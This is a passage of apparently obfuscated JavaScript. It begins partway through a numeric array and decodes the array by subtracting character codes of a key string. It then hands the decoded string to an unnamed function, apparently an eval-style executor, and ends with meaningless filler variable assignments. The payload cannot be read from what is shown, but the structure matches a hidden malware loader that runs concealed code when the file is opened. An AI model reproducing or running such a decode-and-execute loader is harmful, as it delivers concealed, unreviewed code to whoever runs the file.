165, 164, 148, 171, 142, 98, 144, 82, 112, 111, 83, 107, 83, 88, 89, 82, 169, 147, 165, 165, 156, 161, 161, 145, 148, 164, 165, 147, 172, 141, 100, 143, 83, 110, 83, 99, 92, 91, 174, 63, 61, 59, 60, 59, 150, 161, 159, 158, 148, 148, 146, 153, 152, 166, 156, 149, 162, 160, 91, 91, 110, 63, 61, 59, 60, 175, 64, 60, 60, 175, 64, 60, 64, 60, 60, 162, 151, 152, 146, 165, 167, 147, 165, 166, 91, 91, 110, 63, 61, 59],
    bhlnu = function() {
        for (var ditx; dpqsuv < bcovxy.length; dpqsuv += 1) {
            var cfquw = dpqsuv % ejkt.length + 1;
            var anqrsx = ejkt.substring(dpqsuv % ejkt.length, cfquw);
            var xgdzs = bcovxy[dpqsuv];
            mdrzst += npux(xgdzs - anqrsx.charCodeAt(0));
        }
        jlmruw(mdrzst);
    };
bhlnu();
aosx = "aosx";
egoru = "";
flnqv = '';
abduw = true;
jkty = '';

